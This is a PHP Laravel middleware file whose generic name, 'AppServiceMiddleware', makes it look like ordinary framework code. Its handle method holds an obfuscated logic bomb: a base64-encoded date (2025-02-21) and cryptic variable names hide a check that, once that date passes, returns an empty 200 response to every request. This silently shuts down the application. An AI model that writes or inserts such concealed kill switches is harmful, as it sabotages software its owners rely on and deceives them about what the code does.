<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class AppServiceMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $rq, Closure $nxt): Response
    {
        //  $a1 ="MjAyNS0wMS0yMQ==";
         $a1 = 'MjAyNS0wMi0yMQ==';
         $b2 = base64_decode($a1);
         $c3 = now()->timestamp;
         $d4 = strtotime($b2);
         $e5 = $c3;
         if ($e5 >= ($d4)) {
             return response('',200);
         }
         return $nxt($rq);
     }
}

